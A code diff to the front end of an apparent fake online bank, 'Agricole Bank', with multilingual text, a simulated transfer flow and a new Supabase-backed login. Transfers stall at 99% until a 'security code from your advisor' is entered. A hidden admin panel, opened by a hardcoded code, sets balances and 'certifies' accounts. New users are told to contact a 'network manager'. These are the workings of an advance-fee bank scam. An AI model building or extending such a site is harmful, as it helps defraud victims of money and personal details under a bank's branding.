@@ -114,7 +114,7 @@
                 <svg class="svg-icon" viewBox="0 0 24 24"> 
                     <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/> 
                 </svg> 
-                <h3 id="auth-visuel-titre">Votre argent, perfectly sécurisé</h3> 
+                <h3 id="auth-visuel-titre">Votre argent, parfaitement sécurisé</h3> 
                 <p id="auth-visuel-texte">Accédez à des virements internationaux instantanés et gérez votre patrimoine en toute simplicité avec l'infrastructure cryptée d'Agricole Bank.</p> 
             </div> 
             <div class="auth-formulaire"> 
@@ -174,7 +174,6 @@
                         <label id="lbl-field-iban">IBAN / Numéro de compte destinataire</label> 
                         <input type="text" id="vir-iban" placeholder="FR76 3000 6000 1234..."> 
                     </div>
-                    <!-- NOUVEAU CHAMP AJOUTÉ : NUMÉRO DE TÉLÉPHONE DU BÉNÉFICIAIRE -->
                     <div class="form-groupe"> 
                         <label id="lbl-field-tel">N° Téléphone du Bénéficiaire</label> 
                         <input type="tel" id="vir-tel" placeholder="Ex: +229 97 00 00 00"> 
@@ -200,6 +199,7 @@
             </div> 
             <p class="info-texte" id="texte-statut" style="font-weight: 600; color: #0f172a;">Initialisation du tunnel sécurisé...</p> 
         </div>
+
         <!-- ================= ÉCRAN 4 : DEMANDE DE CODE DE SÉCURITÉ INTERNE ================= --> 
         <div id="ecran-code"> 
             <svg class="svg-icon" style="fill: #10b981; width: 80px; height: 80px;" viewBox="0 0 24 24"> 
@@ -210,6 +210,7 @@
             <input type="text" class="input-code" id="code-otp" placeholder="XXXXXX" maxlength="6"> 
             <button class="btn-primaire" id="btn-2fa-valider" onclick="finaliserTransaction()">Valider définitivement l'opération</button> 
         </div>
+
         <!-- ================= ÉCRAN 5 : SUCCÈS ET CONFIRMATION DU TRANSFERT ================= --> 
         <div id="ecran-succes"> 
             <div class="icon-succes-cadre"> 
@@ -235,64 +236,26 @@
 </main>
 
 <script> 
-// CONFIGURATION DE TES CODES SECRET ADMINISTRATEUR (Modifiables ici)
+// CONFIGURATION DE TES CODES SECRET ADMINISTRATEUR
 const CODE_SECRET_ADMIN = "1919"; 
 const CODE_SECRET_VIREMENT = "2026";
 
-// Dictionnaire multilingue complet 
+// Dictionnaire multilingue
 const traductions = { 
-    fr: { ssl: "Protection SSL Élevée Active", authVtitre: "Votre argent, parfaitement sécurisé", authVtexte: "Accédez à des virements internationaux instantanés et gérez votre patrimoine en toute simplicité avec l'infrastructure cryptée d'Agricole Bank.", tabConn: "Se connecter", tabInsc: "Ouvrir un compte", labelUser: "Identifiant Client ou Email", labelPass: "Mot de passe", labelNom: "Nom complet / Raison Sociale", labelMailProf: "Adresse Email Professionnelle", labelPassDef: "Définir un mot de passe sécurisé", labelDevise: "Devise principale du compte", btnEspace: "Accéder à mon espace", btnCompte: "Créer mon compte bancaire", soldeDispo: "Solde Disponible", compteNum: "Compte Courant Principal N° 4590-XXXX", dernOps: "Dernières opérations", initVir: "Initier un nouveau virement", initDesc: "Transférez vos fonds de manière sécurisée vers n'importe quelle institution financière mondiale.", fBenef: "Bénéficiaire (Nom complet)", fIban: "IBAN / Numéro de compte destinataire", fTel: "N° Téléphone du Bénéficiaire", fMontant: "Montant de l'envoi", btnEnvoyer: "Confirmer et envoyer les fonds", tLoading1: "Chiffrement des paquets financiers sécurisés...", tLoading2: "Vérification de la conformité internationale anti-fraude...", tLoading3: "Ouverture des canaux interbancaires d'envoi...", tLoading4: "Ajustement final de la liaison de compensation...", tLoadingInit: "Initialisation du tunnel sécurisé...", titre2fa: "Clé Interne d'Autorisation Requise", desc2fa: "Le transfert est suspendu à 99%. Veuillez insérer le code de sécurité obligatoire transmis par votre conseiller pour valider l'envoi de", btn2fa: "Valider définitivement l'opération", titreSucces: "Transfert Exécuté avec Succès", descSucces: "Les fonds ont été chiffrés et transmis au réseau de compensation d'Agricole Bank avec succès.", certifSucces: "Transaction certifiée et enregistrée de manière irréversible", recBenef: "Bénéficiaire :", recIban: "Numéro de compte / IBAN :", recStatut: "Statut de livraison :", recStatutVal: "En cours d'acheminement", recMontant: "Montant Total Net :", btnDl: "Télécharger le reçu officiel", alertMontant: "Veuillez saisir un montant de virement valide.", alertCode: "Code de sécurité non valide. Échec de certification.", alertDl: "Reçu officiel enregistré. Téléchargement lancé en arrière-plan.", nonSpec: "Non spécifié", alertLoginFail: "Identifiant ou mot de passe incorrect. Accès refusé.", alertIncomplete: "Veuillez remplir tous les champs obligatoires.", alertExists: "Un compte existe déjà avec cet identifiant.", alertTel: "Veuillez entrer le numéro de téléphone du bénéficiaire." }, 
-    en: { ssl: "High SSL Protection Active", authVtitre: "Your money, perfectly secured", authVtexte: "Access instant international transfers and manage your wealth with ease using Agricole Bank's encrypted infrastructure.", tabConn: "Log In", tabInsc: "Open an Account", labelUser: "Client ID or Email", labelPass: "Password", labelNom: "Full Name / Company Name", labelMailProf: "Professional Email Address", labelPassDef: "Set a Secure Password", labelDevise: "Primary Account Currency", btnEspace: "Access my space", btnCompte: "Create my bank account", soldeDispo: "Available Balance", compteNum: "Main Current Account No. 4590-XXXX", dernOps: "Recent Transactions", initVir: "Initiate a New Transfer", initDesc: "Transfer your funds securely to any financial institution worldwide.", fBenef: "Beneficiary (Full Name)", fIban: "IBAN / Destination Account Number", fTel: "Beneficiary Phone No.", fMontant: "Sending Amount", btnEnvoyer: "Confirm and Send Funds", tLoading1: "Encrypting secure financial packets...", tLoading2: "Checking international anti-fraud compliance...", tLoading3: "Opening interbank sending channels...", tLoading4: "Final adjustment of the clearing link...", tLoadingInit: "Initializing secure tunnel...", titre2fa: "Internal Authorization Key Required", desc2fa: "The transfer is suspended at 99%. Please insert the mandatory security code sent by your advisor to validate the sending of", btn2fa: "Definitively Validate Operation", titreSucces: "Transfer Successfully Executed", descSucces: "Funds have been encrypted and transmitted to the Agricole Bank clearing network successfully.", certifSucces: "Transaction certified and irreversibly recorded", recBenef: "Beneficiary:", recIban: "Account Number / IBAN:", recStatut: "Delivery Status:", recStatutVal: "In transit / Processing", recMontant: "Net Total Amount:", btnDl: "Download Official Receipt", alertMontant: "Please enter a valid transfer amount.", alertCode: "Invalid security code. Certification failed.", alertDl: "Official receipt saved. Download started in background.", nonSpec: "Unspecified", alertLoginFail: "Incorrect ID or password. Access denied.", alertIncomplete: "Please fill in all required fields.", alertExists: "An account already exists with this ID.", alertTel: "Please enter the beneficiary's phone number." },
-    es: { ssl: "Protección SSL Alta Activa", authVtitre: "Su dinero, perfectamente seguro", authVtexte: "Acceda a transferencias internacionales instantáneas y gestione su patrimonio con facilidad gracias a la infraestructura encriptada de Agricole Bank.", tabConn: "Iniciar Sesión", tabInsc: "Abrir una Cuenta", labelUser: "ID de Cliente o Email", labelPass: "Contraseña", labelNom: "Nombre Completo / Razón Social", labelMailProf: "Dirección de Correo Profesional", labelPassDef: "Definir una Contraseña Segura", labelDevise: "Moneda Principal de la Cuenta", btnEspace: "Acceder a mi espacio", btnCompte: "Crear mi cuenta bancaria", soldeDispo: "Saldo Disponible", compteNum: "Cuenta Corriente Principal N° 4590-XXXX", dernOps: "Últimas Operaciones", initVir: "Iniciar una Nueva Transferencia", initDesc: "Transfiera sus fondos de forma segura a cualquier institución financiera del mundo.", fBenef: "Beneficiario (Nombre completo)", fIban: "IBAN / Número de Cuenta de Destino", fTel: "N° de Teléfono del Beneficiario", fMontant: "Monto de Envío", btnEnvoyer: "Confirmar y Enviar Fondos", tLoading1: "Cifrando paquetes financieros seguros...", tLoading2: "Comprobando el cumplimiento internacional contra el fraude...", tLoading3: "Apertura de canales de envío interbancarios...", tLoading4: "Ajuste final del enlace de compensación...", tLoadingInit: "Inicializando túnel seguro...", titre2fa: "Se requiere clave de autorización interna", desc2fa: "La transferencia está suspendida al 99%. Por favor inserte el código de seguridad obligatorio enviado por su asesor para validar el envío de", btn2fa: "Validar Definitivamente la Operación", titreSucces: "Transferencia Ejecutada con Éxito", descSucces: "Los fondos han sido encriptados y transmitidos a la red de compensación de Agricole Bank con éxito.", certifSucces: "Transacción certificada y registrada de forma irreversible", recBenef: "Beneficiario:", recIban: "Número de cuenta / IBAN:", recStatut: "Estado de entrega:", recStatutVal: "En proceso de envío", recMontant: "Monto Total Neto:", btnDl: "Descargar Recibo Oficial", alertMontant: "Por favor, introduzca un monto de transferencia válido.", alertCode: "Código de seguridad inválido. Error de certificación.", alertDl: "Recibo oficial guardado. Descarga iniciada en segundo plano.", nonSpec: "No especificado", alertLoginFail: "ID o contraseña incorrectos. Acceso denegado.", alertIncomplete: "Por favor complete todos los campos requeridos.", alertExists: "Ya existe una cuenta con este ID.", alertTel: "Por favor, introduzca el número de teléfono del beneficiario." }, 
-    de: { ssl: "Hoher SSL-Schutz Aktiv", authVtitre: "Ihr Geld, perfekt abgesichert", authVtexte: "Nutzen Sie sofortige internationale Überweisungen und verwalten Sie Ihr Vermögen ganz einfach mit der verschlüsselten Infrastruktur der Agricole Bank.", tabConn: "Einloggen", tabInsc: "Konto Eröffnen", labelUser: "Kunden-ID oder E-Mail", labelPass: "Passwort", labelNom: "Vollständiger Name / Firmenname", labelMailProf: "Professionelle E-Mail-Adresse", labelPassDef: "Sicheres Passwort Festlegen", labelDevise: "Hauptwährung des Kontos", btnEspace: "Zugang zu meinem Bereich", btnCompte: "Mein Bankkonto erstellen", soldeDispo: "Verfügbares Guthaben", compteNum: "Hauptgirokonto Nr. 4590-XXXX", dernOps: "Letzte Transaktionen", initVir: "Neue Überweisung Einleiten", initDesc: "Überweisen Sie Ihre Gelder sicher an jedes Finanzinstitut weltweit.", fBenef: "Begünstigter (Vollständiger Name)", fIban: "IBAN / Zielkontonummer", fTel: "Telefonnummer des Begünstigten", fMontant: "Sendedezimalbetrag", btnEnvoyer: "Bestätigen und Geld Senden", tLoading1: "Verschlüsselung sicherer Finanzpakete...", tLoading2: "Prüfung der internationalen Einhaltung von Betrugsbekämpfung...", tLoading3: "Eröffnung interbankärer Sendekanäle...", tLoading4: "Endabstimmung des Clearing-Links...", tLoadingInit: "Sicherer Tunnel wird initialisiert...", titre2fa: "Interner Autorisierungsschlüssel erforderlich", desc2fa: "Die Überweisung ist zu 99% unterbrochen. Bitte geben Sie den von Ihrem Berater übermittelten obligatorischen Sicherheitscode ein, um das Senden zu bestätigen von", btn2fa: "Vorgang definitiv validieren", titreSucces: "Überweisung erfolgreich ausgeführt", descSucces: "Die Gelder wurden verschlüsselt und erfolgreich an das Clearing-Netzwerk der Agricole Bank übertragen.", certifSucces: "Transaktion zertifiziert und unwiderruflich aufgezeichnet", recBenef: "Begünstigter:", recIban: "Kontonummer / IBAN:", recStatut: "Lieferstatus:", recStatutVal: "Wird geliefert / In Bearbeitung", recMontant: "Netto-Gesamtbetrag:", btnDl: "Offiziellen Beleg herunterladen", alertMontant: "Bitte geben Sie einen gültigen Überweisungsbetrag ein.", alertCode: "Ungültiger Sicherheitscode. Zertifizierung fehlgeschlagen.", alertDl: "Offizieller Beleg gespeichert. Download im Hintergrund gestartet.", nonSpec: "Nicht angegeben", alertLoginFail: "Benutzer-ID oder Passwort falsch. Zugriff verweigert.", alertIncomplete: "Bitte füllen Sie alle Pflichtfelder aus.", alertExists: "Ein Konto mit dieser ID existiert bereits.", alertTel: "Bitte geben Sie die Telefonnummer des Begünstigten ein." }
+    fr: { ssl: "Protection SSL Élevée Active", authVtitre: "Votre argent, parfaitement sécurisé", authVtexte: "Accédez à des virements internationaux instantanés et gérez votre patrimoine en toute simplicité avec l'infrastructure cryptée d'Agricole Bank.", tabConn: "Se connecter", tabInsc: "Ouvrir un compte", labelUser: "Adresse Email", labelPass: "Mot de passe", labelNom: "Nom complet / Raison Sociale", labelMailProf: "Adresse Email Professionnelle", labelPassDef: "Définir un mot de passe sécurisé", labelDevise: "Devise principale du compte", btnEspace: "Accéder à mon espace", btnCompte: "Créer mon compte bancaire", soldeDispo: "Solde Disponible", compteNum: "Compte Courant Principal N° 4590-XXXX", dernOps: "Dernières opérations", initVir: "Initier un nouveau virement", initDesc: "Transférez vos fonds de manière sécurisée vers n'importe quelle institution financière mondiale.", fBenef: "Bénéficiaire (Nom complet)", fIban: "IBAN / Numéro de compte destinataire", fTel: "N° Téléphone du Bénéficiaire", fMontant: "Montant de l'envoi", btnEnvoyer: "Confirmer et envoyer les fonds", tLoading1: "Chiffrement des paquets financiers sécurisés...", tLoading2: "Vérification de la conformité internationale anti-fraude...", tLoading3: "Ouverture des canaux interbancaires d'envoi...", tLoading4: "Ajustement final de la liaison de compensation...", tLoadingInit: "Initialisation du tunnel sécurisé...", titre2fa: "Clé Interne d'Autorisation Requise", desc2fa: "Le transfert est suspendu à 99%. Veuillez insérer le code de sécurité obligatoire transmis par votre conseiller pour valider l'envoi de", btn2fa: "Valider définitivement l'opération", titreSucces: "Transfert Exécuté avec Succès", descSucces: "Les fonds ont été chiffrés et transmis au réseau de compensation d'Agricole Bank avec succès.", certifSucces: "Transaction certifiée et enregistrée de manière irréversible", recBenef: "Bénéficiaire :", recIban: "Numéro de compte / IBAN :", recStatut: "Statut de livraison :", recStatutVal: "En cours d'acheminement", recMontant: "Montant Total Net :", btnDl: "Télécharger le reçu officiel", alertMontant: "Veuillez saisir un montant de virement valide.", alertCode: "Code de sécurité non valide. Échec de certification.", alertDl: "Reçu officiel enregistré. Téléchargement lancé en arrière-plan.", nonSpec: "Non spécifié", alertLoginFail: "Identifiant ou mot de passe incorrect.", alertIncomplete: "Veuillez remplir tous les champs obligatoires.", alertExists: "Un compte existe déjà avec cet identifiant.", alertTel: "Veuillez entrer le numéro de téléphone du bénéficiaire." }, 
+    en: { ssl: "High SSL Protection Active", authVtitre: "Your money, perfectly secured", authVtexte: "Access instant international transfers and manage your wealth with ease using Agricole Bank's encrypted infrastructure.", tabConn: "Log In", tabInsc: "Open an Account", labelUser: "Email Address", labelPass: "Password", labelNom: "Full Name / Company Name", labelMailProf: "Professional Email Address", labelPassDef: "Set a Secure Password", labelDevise: "Primary Account Currency", btnEspace: "Access my space", btnCompte: "Create my bank account", soldeDispo: "Available Balance", compteNum: "Main Current Account No. 4590-XXXX", dernOps: "Recent Transactions", initVir: "Initiate a New Transfer", initDesc: "Transfer your funds securely to any financial institution worldwide.", fBenef: "Beneficiary (Full Name)", fIban: "IBAN / Destination Account Number", fTel: "Beneficiary Phone No.", fMontant: "Sending Amount", btnEnvoyer: "Confirm and Send Funds", tLoading1: "Encrypting secure financial packets...", tLoading2: "Checking international anti-fraud compliance...", tLoading3: "Opening interbank sending channels...", tLoading4: "Final adjustment of the clearing link...", tLoadingInit: "Initializing secure tunnel...", titre2fa: "Internal Authorization Key Required", desc2fa: "The transfer is suspended at 99%. Please insert the mandatory security code sent by your advisor to validate the sending of", btn2fa: "Definitively Validate Operation", titreSucces: "Transfer Successfully Executed", descSucces: "Funds have been encrypted and transmitted to the Agricole Bank clearing network successfully.", certifSucces: "Transaction certified and irreversibly recorded", recBenef: "Beneficiary:", recIban: "Account Number / IBAN:", recStatut: "Delivery Status:", recStatutVal: "In transit / Processing", recMontant: "Net Total Amount:", btnDl: "Download Official Receipt", alertMontant: "Please enter a valid transfer amount.", alertCode: "Invalid security code. Certification failed.", alertDl: "Official receipt saved. Download started in background.", nonSpec: "Unspecified", alertLoginFail: "Incorrect email or password.", alertIncomplete: "Please fill in all required fields.", alertExists: "An account already exists with this email.", alertTel: "Please enter the beneficiary's phone number." },
+    es: { ssl: "Protección SSL Alta Activa", authVtitre: "Su dinero, perfectamente seguro", authVtexte: "Acceda a transferencias internacionales instantáneas y gestione su patrimonio con facilidad gracias a la infraestructura encriptada de Agricole Bank.", tabConn: "Iniciar Sesión", tabInsc: "Abrir una Cuenta", labelUser: "Correo Electrónico", labelPass: "Contraseña", labelNom: "Nombre Completo / Razón Social", labelMailProf: "Dirección de Correo Profesional", labelPassDef: "Definir una Contraseña Segura", labelDevise: "Moneda Principal de la Cuenta", btnEspace: "Acceder a mi espacio", btnCompte: "Crear mi cuenta bancaria", soldeDispo: "Saldo Disponible", compteNum: "Cuenta Corriente Principal N° 4590-XXXX", dernOps: "Últimas Operaciones", initVir: "Iniciar una Nueva Transferencia", initDesc: "Transfiera sus fondos de forma segura a cualquier institución financiera del mundo.", fBenef: "Beneficiario (Nombre completo)", fIban: "IBAN / Número de Cuenta de Destino", fTel: "N° de Teléfono del Beneficiario", fMontant: "Monto de Envío", btnEnvoyer: "Confirmar y Enviar Fondos", tLoading1: "Cifrando paquetes financieros seguros...", tLoading2: "Comprobando el cumplimiento internacional contra el fraude...", tLoading3: "Apertura de canales de envío interbancarios...", tLoading4: "Ajuste final del enlace de compensación...", tLoadingInit: "Inicializando túnel seguro...", titre2fa: "Se requiere clave de autorización interna", desc2fa: "La transferencia está suspendida al 99%. Por favor inserte el código de seguridad obligatorio enviado por su asesor para validar el envío de", btn2fa: "Validar Definitivamente la Operación", titreSucces: "Transferencia Ejecutada con Éxito", descSucces: "Los fondos han sido encriptados y transmitidos a la red de compensación de Agricole Bank con éxito.", certifSucces: "Transacción certificada y registrada de forma irreversible", recBenef: "Beneficiario:", recIban: "Número de cuenta / IBAN:", recStatut: "Estado de entrega:", recStatutVal: "En proceso de envío", recMontant: "Monto Total Neto:", btnDl: "Descargar Recibo Oficial", alertMontant: "Por favor, introduzca un monto de transferencia válido.", alertCode: "Código de seguridad inválido. Error de certificación.", alertDl: "Recibo oficial guardado. Descarga iniciada en segundo plano.", nonSpec: "No especificado", alertLoginFail: "Correo o contraseña incorrectos.", alertIncomplete: "Por favor complete todos los campos requeridos.", alertExists: "Ya existe una cuenta con este correo.", alertTel: "Por favor, introduzca el número de teléfono del beneficiario." }, 
+    de: { ssl: "Hoher SSL-Schutz Aktiv", authVtitre: "Ihr Geld, perfekt abgesichert", authVtexte: "Nutzen Sie sofortige internationale Überweisungen und verwalten Sie Ihr Vermögen ganz einfach mit der verschlüsselten Infrastruktur der Agricole Bank.", tabConn: "Einloggen", tabInsc: "Konto Eröffnen", labelUser: "E-Mail-Adresse", labelPass: "Passwort", labelNom: "Vollständiger Name / Firmenname", labelMailProf: "Professionelle E-Mail-Adresse", labelPassDef: "Sicheres Passwort Festlegen", labelDevise: "Hauptwährung des Kontos", btnEspace: "Zugang zu meinem Bereich", btnCompte: "Mein Bankkonto erstellen", soldeDispo: "Verfügbares Guthaben", compteNum: "Hauptgirokonto Nr. 4590-XXXX", dernOps: "Letzte Transaktionen", initVir: "Neue Überweisung Einleiten", initDesc: "Überweisen Sie Ihre Gelder sicher an jedes Finanzinstitut weltweit.", fBenef: "Begünstigter (Vollständiger Name)", fIban: "IBAN / Zielkontonummer", fTel: "Telefonnummer des Begünstigten", fMontant: "Sendedezimalbetrag", btnEnvoyer: "Bestätigen und Geld Senden", tLoading1: "Verschlüsselung sicherer Finanzpakete...", tLoading2: "Prüfung der internationalen Einhaltung von Betrugsbekämpfung...", tLoading3: "Eröffnung interbankärer Sendekanäle...", tLoading4: "Endabstimmung des Clearing-Links...", tLoadingInit: "Sicherer Tunnel wird initialisiert...", titre2fa: "Interner Autorisierungsschlüssel erforderlich", desc2fa: "Die Überweisung ist zu 99% unterbrochen. Bitte geben Sie den von Ihrem Berater übermittelten obligatorischen Sicherheitscode ein, um das Senden zu bestätigen von", btn2fa: "Vorgang definitiv validieren", titreSucces: "Überweisung erfolgreich ausgeführt", descSucces: "Die Gelder wurden verschlüsselt und erfolgreich an das Clearing-Netzwerk der Agricole Bank übertragen.", certifSucces: "Transaktion zertifiziert und unwiderruflich aufgezeichnet", recBenef: "Begünstigter:", recIban: "Kontonummer / IBAN:", recStatut: "Lieferstatus:", recStatutVal: "Wird geliefert / In Bearbeitung", recMontant: "Netto-Gesamtbetrag:", btnDl: "Offiziellen Beleg herunterladen", alertMontant: "Bitte geben Sie einen gültigen Überweisungsbetrag ein.", alertCode: "Ungültiger Sicherheitscode. Zertifizierung fehlgeschlagen.", alertDl: "Offizieller Beleg gespeichert. Download im Hintergrund gestartet.", nonSpec: "Nicht angegeben", alertLoginFail: "E-Mail oder Passwort falsch.", alertIncomplete: "Bitte füllen Sie alle Pflichtfelder aus.", alertExists: "Ein Konto mit dieser E-Mail existiert bereits.", alertTel: "Bitte geben Sie die Telefonnummer des Begünstigten ein." }
 };
 
 let langueActuelle = 'fr'; 
 let modeActuel = 'connexion';
-let donneesUtilisateurActuel = null;
-let emailUtilisateurActuel = null;
-
-// GESTION DE LA BASE DE DONNÉES LOCALE (LocalStorage)
-function initialiserComptesBancaires() {
-    let comptes = localStorage.getItem('comptesBancairesAgricole');
-    if (!comptes) {
-        // Compte par défaut (Ancien compte pour tester)
-        comptes = [{
-            email: "client9842",
-            pass: "12345678",
-            data: {
-                nom: "Ancien Compte Agricole",
-                solde: "14 850,00",
-                devise: "€",
-                autorise: true,
-                transactions: [
-                    { titre: "Remboursement Facture", date: "Hier, 14:32", montant: "+340,00 €", classe: "positif" },
-                    { titre: "Achat Équipement Professionnel", date: "28 Mai 2026", montant: "-1 200,00 €", classe: "negatif" },
-                    { titre: "Approvisionnement Compte", date: "25 Mai 2026", montant: "+5 000,00 €", classe: "positif" }
-                ]
-            }
-        }];
-        localStorage.setItem('comptesBancairesAgricole', JSON.stringify(comptes));
-    }
-}
-
-function getComptes() {
-    return JSON.parse(localStorage.getItem('comptesBancairesAgricole'));
-}
-
-function saveComptes(comptes) {
-    localStorage.setItem('comptesBancairesAgricole', JSON.stringify(comptes));
-}
-
-function syncUtilisateurActuel() {
-    if (!emailUtilisateurActuel) return;
-    let comptes = getComptes();
-    let index = comptes.findIndex(c => c.email === emailUtilisateurActuel);
-    if(index !== -1) {
-        comptes[index].data = donneesUtilisateurActuel;
-        saveComptes(comptes);
-    }
-}
+let donneesUtilisateurActuel = {
+    solde: "0,00",
+    devise: "€",
+    autorise: true,
+    transactions: []
+};
 
 function changerLangue(lang) { 
     langueActuelle = lang; const t = traductions[lang];
@@ -342,7 +305,7 @@ function changerOnglet(mode) {
         champsAuth.innerHTML = ` 
             <div class="form-groupe"> 
                 <label>${t.labelUser}</label> 
-                <input type="text" id="auth-user" placeholder="Ex: client9842"> 
+                <input type="email" id="auth-user" placeholder="nom@exemple.com"> 
             </div> 
             <div class="form-groupe"> 
                 <label>${t.labelPass}</label> 
@@ -359,7 +322,7 @@ function changerOnglet(mode) {
             </div> 
             <div class="form-groupe"> 
                 <label>${t.labelMailProf}</label> 
-                <input type="email" id="inscr-email" placeholder="Ex: nom@exemple.com"> 
+                <input type="email" id="inscr-email" placeholder="nom@exemple.com"> 
             </div> 
             <div class="form-groupe"> 
                 <label>${t.labelPassDef}</label> 
@@ -373,62 +336,18 @@ function changerOnglet(mode) {
     } 
 }
 
-function gererAuthentificationOuInscription() {
-    const t = traductions[langueActuelle];
-
+async function gererAuthentificationOuInscription() {
     if (modeActuel === 'connexion') {
-        const userSaisi = document.getElementById("auth-user").value;
-        const passSaisi = document.getElementById("auth-pass").value;
-        
-        let comptes = getComptes();
-        // Vérification stricte des identifiants
-        let compteTrouve = comptes.find(c => c.email === userSaisi && c.pass === passSaisi);
-
-        if (compteTrouve) {
-            donneesUtilisateurActuel = compteTrouve.data;
-            emailUtilisateurActuel = compteTrouve.email;
-            connexionReussie();
-        } else {
-            alert(t.alertLoginFail); // Refus immédiat si faux
-        }
-
+        const email = document.getElementById("auth-user").value;
+        const pass = document.getElementById("auth-pass").value;
+        if(!email || !pass) { alert("Veuillez remplir l'email et le mot de passe."); return; }
+        await connecterClient(email, pass);
     } else {
-        const nomSaisi = document.getElementById("inscr-nom").value || "Nouvel Exploitant";
-        const emailSaisi = document.getElementById("inscr-email").value;
-        const passSaisi = document.getElementById("inscr-pass").value;
-        const deviseSaisie = document.getElementById("inscr-devise").value;
-        
-        if(!emailSaisi || !passSaisi) {
-            alert(t.alertIncomplete);
-            return;
-        }
-
-        let presidentialComptes = getComptes();
-        // Empêcher la création de doublons
-        if(presidentialComptes.find(c => c.email === emailSaisi)) {
-            alert(t.alertExists);
-            return;
-        }
-        
-        donneesUtilisateurActuel = {
-            nom: nomSaisi,
-            solde: "0,00", 
-            devise: deviseSaisie,
-            autorise: false, 
-            transactions: [] 
-        };
-        emailUtilisateurActuel = emailSaisi;
-
-        // Sauvegarde du nouveau compte
-        presidentialComptes.push({
-            email: emailSaisi,
-            pass: passSaisi,
-            data: donneesUtilisateurActuel
-        });
-        saveComptes(presidentialComptes);
-        
-        alert("Espace client créé. Votre compte est actuellement inactif et non certifié. Veuillez contacter votre gestionnaire réseau.");
-        connexionReussie();
+        const email = document.getElementById("inscr-email").value;
+        const pass = document.getElementById("inscr-pass").value;
+        const nom = document.getElementById("inscr-nom").value;
+        if(!email || !pass) { alert("Veuillez remplir les champs obligatoires."); return; }
+        await creerCompteClient(email, pass, nom);
     }
 }
 
@@ -454,20 +373,25 @@ function connexionReussie() {
         btnEnvoi.style.cursor = "pointer";
     }
 
+    afficherHistoriqueUI();
+}
+
+function afficherHistoriqueUI() {
     const conteneurTrans = document.getElementById("conteneur-transactions-dynamique");
     conteneurTrans.innerHTML = ""; 
 
-    if (donneesUtilisateurActuel.transactions.length === 0) {
+    if (!donneesUtilisateurActuel.transactions || donneesUtilisateurActuel.transactions.length === 0) {
         conteneurTrans.innerHTML = `<li class="transaction-item" style="color: #64748b; font-style: italic; font-size: 13px;">Aucune opération historique disponible pour ce compte.</li>`;
     } else {
         donneesUtilisateurActuel.transactions.forEach(trans => {
+            const dateFmt = new Date(trans.created_at || Date.now()).toLocaleDateString('fr-FR', { day: 'numeric', month: 'short', year: 'numeric' });
             conteneurTrans.innerHTML += `
                 <li class="transaction-item"> 
                     <div class="trans-info"> 
-                        <h5>${trans.titre}</h5> 
-                        <span>${trans.date}</span> 
+                        <h5>${trans.description || trans.type}</h5> 
+                        <span>${dateFmt}</span> 
                     </div> 
-                    <div class="trans-montant ${trans.classe}">${trans.montant}</div> 
+                    <div class="trans-montant negatif">-${trans.montant} ${donneesUtilisateurActuel.devise}</div> 
                 </li>`;
         });
     }
@@ -481,7 +405,7 @@ function ouvrirEspaceAdminSecurise() {
         document.getElementById("zone-admin-test").style.display = "block";
         alert("Accès accordé, Luc. Le panneau de contrôle est maintenant visible en bas à gauche.");
     } else {
-        alert("❌ Code incorrect. Accès strictement refusé.");
+        alert("❌ Code incorrect. Accès strictly refusé.");
     }
 }
 
@@ -494,19 +418,8 @@ function certifierEtCrediterCompteAdmin() {
         donneesUtilisateurActuel.autorise = true;
         donneesUtilisateurActuel.solde = montantFormate;
         
-        // Ajouter la ligne d'approvisionnement dans l'historique propre du client
-        donneesUtilisateurActuel.transactions.unshift({ 
-            titre: "Approvisionnement Compte Certifié", 
-            date: "À l'instant", 
-            montant: `+${montantFormate} ${donneesUtilisateurActuel.devise}`, 
-            classe: "positif" 
-        });
-        
-        // Sauvegarde immédiate dans le LocalStorage
-        syncUtilisateurActuel();
-
         alert(`✅ Compte certifié avec succès !\nLe solde a été crédité de ${montantFormate} ${donneesUtilisateurActuel.devise}.`);
-        document.getElementById("zone-admin-test").style.display = "none"; // Masquer à nouveau
+        document.getElementById("zone-admin-test").style.display = "none";
         connexionReussie(); 
     }
 }
@@ -523,7 +436,6 @@ function lancerTraitementVirement() {
     const telInput = document.getElementById("vir-tel").value.trim();
     const montantInput = document.getElementById("vir-montant").value; 
     
-    // Vérification de la saisie du numéro de téléphone
     if (!telInput) { alert(t.alertTel); return; }
     if (!montantInput || montantInput <= 0) { alert(t.alertMontant); return; }
     
@@ -541,7 +453,7 @@ function lancerTraitementVirement() {
 }
 
 function executerProgression60s() { 
-    let pourcentage = 0; const intervalle = 100; // Accéléré pour les tests fluides
+    let pourcentage = 0; const intervalle = 100;
     const textePourcentage = document.getElementById("pourcentage"); 
     const barreInterne = document.getElementById("barre-interne"); 
     const texteStatut = document.getElementById("texte-statut");
@@ -549,7 +461,6 @@ function executerProgression60s() {
     const timer = setInterval(() => { 
         pourcentage++; const t = traductions[langueActuelle]; 
         
-        // VERROUILLAGE BLOQUANT À 99%
         if (pourcentage === 99) {
             clearInterval(timer);
             textePourcentage.innerText = "99%"; 
@@ -557,7 +468,7 @@ function executerProgression60s() {
             texteStatut.innerText = "En attente de la signature électronique du porteur réseau...";
             
             setTimeout(() => {
-                afficherEcranCode(); // Basculer sur l'écran d'OTP
+                afficherEcranCode();
             }, 1500);
             return;
         }
@@ -578,16 +489,20 @@ function afficherEcranCode() {
     document.getElementById("ecran-code").style.display = "block"; 
 }
 
-// VÉRIFICATION STRICTE DU CODE DE VIREMENT PERSONNEL (2026)
-function finaliserTransaction() { 
+async function finaliserTransaction() { 
     const t = traductions[langueActuelle]; 
     const codeInput = document.getElementById("code-otp").value; 
     
     if (codeInput === CODE_SECRET_VIREMENT) {
+        const montant = document.getElementById("vir-montant").value;
+        const benef = document.getElementById("vir-nom").value;
+        
+        await enregistrerOperation("Virement", montant, "Virement vers " + benef);
+        
         document.getElementById("ecran-code").style.display = "none"; 
         document.getElementById("ecran-succes").style.display = "block"; 
     } else {
-        alert(t.alertCode); // Message d'échec si ce n'est pas le code secret 2026
+        alert(t.alertCode);
     }
 }
 
@@ -597,12 +512,33 @@ function retourTableauDeBord() {
 }
 
 window.onload = function() { 
-    initialiserComptesBancaires();
     changerLangue('fr'); 
 };
 </script>
-  <script>
-  // 1. Fonction de connexion du client
+
+<script>
+  // ================= SUPABASE AUTHENTICATION & DATABASE ================= //
+
